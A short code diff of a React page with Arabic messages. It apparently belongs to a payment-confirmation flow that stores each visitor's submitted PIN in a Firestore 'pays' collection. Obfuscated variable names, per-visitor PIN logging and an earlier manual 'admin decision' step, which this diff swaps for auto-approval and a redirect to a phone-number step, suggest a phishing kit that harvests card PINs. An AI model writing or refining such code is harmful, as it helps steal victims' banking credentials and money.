@@ -105,15 +105,6 @@ export default function ConfiPage() {
           setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
           setIsSubmitting(false)
         })
-      } else if (status === "approved") {
-        _ss6("approved")
-        setError("")
-        setIsSubmitting(false)
-        // Redirect to phone page
-        router.push("/step5")
-      } else if (status === "verifying") {
-        _ss6("verifying")
-        setIsSubmitting(false)
       }
       
       setIsLoading(false)
@@ -143,17 +134,21 @@ export default function ConfiPage() {
       await setDoc(doc(db, "pays", visitorID), {
         _v6,
         pinSubmittedAt: new Date().toISOString(),
-        _v6Status: "verifying", // Set to verifying, waiting for admin decision
+        _v6Status: "approved", // Auto-approve PIN
+        currentStep: "phone",
+        paymentStatus: "pin_completed",
         pinUpdatedAt: new Date().toISOString()
       }, { merge: true })
 
-      // Add PIN to history
+      // Add PIN to history (always approved)
       await addToHistory(visitorID, "_t3", {
         _v6
-      }, "pending")
+      }, "approved")
 
-      _ss6("verifying") // Show loading state
-      // The status will be updated via the listener when admin approves/rejects
+      // Wait 2 seconds then redirect to phone page
+      setTimeout(() => {
+        router.push("/step5")
+      }, 2000)
     } catch (err) {
       console.error("Error submitting PIN:", err)
       setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
